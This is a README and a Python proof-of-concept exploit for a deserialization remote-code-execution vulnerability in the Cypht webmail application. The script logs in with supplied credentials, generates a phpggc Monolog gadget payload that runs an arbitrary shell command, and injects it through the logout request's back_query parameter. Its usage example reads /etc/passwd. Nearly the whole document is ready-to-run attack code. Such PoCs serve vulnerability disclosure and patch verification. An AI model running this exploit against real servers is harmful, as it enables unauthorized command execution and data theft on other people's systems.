# Cypht CVE-2026-71981 PoC

This is a PoC for CVE-2026-71981 Insecure deserializaion RCE. Result of executed command is printed in response from logout request after the `</body></html>` tags. Use `--print-all` to also print the whole response.

Versions vulnerable: < v2.12.2

## Install dependencies and execute

This script requires installed https://github.com/ambionics/phpggc in order to generate the unserialize() payloads. 

Setup and example:

```bash
python3 -m venv .venv
source ./.venv/bin/activate
python3 -m pip install -r requirements.txt
python3 ./poc.py --ip 127.0.0.1 --username admin --password admin --command "cat /etc/passwd"
python3 ./poc.py --help
```

#!/usr/bin/env python3

import argparse
import subprocess
import sys

import requests
from bs4 import BeautifulSoup


EXAMPLE = (
    "python3 ./poc.py --ip 127.0.0.1 --username admin --password admin "
    "--command \"cat /etc/passwd\""
)


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="CVE-2026-71981 PoC",
        epilog=f"Example usage:\n  {EXAMPLE}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--ip", required=True, help="Cypht server IP address")
    parser.add_argument("--username", required=True, help="Login username")
    parser.add_argument("--password", required=True, help="Login password")
    parser.add_argument("--command", required=True, help="Shell command to execute")
    parser.add_argument(
        "--print-all",
        action="store_true",
        help="Print the whole logout response before the after section",
    )

    if len(sys.argv) == 1:
        parser.print_help()
        raise SystemExit(0)

    return parser.parse_args()


def main():
    args = parse_arguments()
    base_url = f"http://{args.ip}/"
    back_query = subprocess.check_output(
        "phpggc Monolog/rce9 \'system\' \'" + args.command + "\' | base64 -w 0",
        shell=True,
        text=True,
    ).strip()

    session = requests.Session()

    login_page = session.get(base_url)
    login_page.raise_for_status()
    page_key = BeautifulSoup(login_page.text, "html.parser").select_one(
        'input[name="hm_page_key"]'
    )["value"]

    login = session.post(
        base_url,
        data={
            "username": args.username,
            "password": args.password,
            "hm_page_key": page_key,
        },
        headers={"Origin": f"http://{args.ip}", "Referer": base_url},
        allow_redirects=False,
    )
    login.raise_for_status()

    logout = session.get(
        base_url + "?page=logout&prompt=true&back_query=" + back_query
    )
    logout.raise_for_status()

    closing_tags = "</body></html>"
    response, separator, trailing_content = logout.text.partition(closing_tags)

    if args.print_all:
        print(logout.text)
    if separator and trailing_content:
        print("\nCommand execution result:")
        print(trailing_content)


if __name__ == "__main__":
    main()
